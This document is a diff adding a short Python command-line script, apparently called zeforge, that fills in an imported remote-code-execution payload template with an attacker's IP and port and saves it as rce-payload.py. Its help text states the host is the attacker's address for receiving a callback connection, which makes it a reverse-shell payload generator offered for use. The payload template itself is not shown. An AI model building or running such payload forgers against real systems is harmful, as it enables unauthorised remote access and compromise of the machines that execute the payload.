@@ -1,0 +1,28 @@
+#!/usr/bin/env python
+import argparse
+import io
+from cores.payload_scripts import rcepayload
+def run_zeforge(host: str, port: int):
+    filename="./payloads/rce-payload.py"
+    pfile=io.open(filename, "w+")
+    pfile.write(rcepayload.format(host, port))
+    print(f"Saved: {filename}")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(
+        description="Forge payload for remote access."
+    )
+    parser.add_argument(
+        "--host",
+        type=str,
+        help="Attacker's IP address for receiving the callback connection.",
+        required=True
+    )
+    parser.add_argument(
+        "--port",
+        type=int,
+        help="Port number (must be greater than 1023) to listen for the incoming connection.",
+        required=True
+    )
+    args = parser.parse_args()
+    run_zeforge(args.host, args.port)
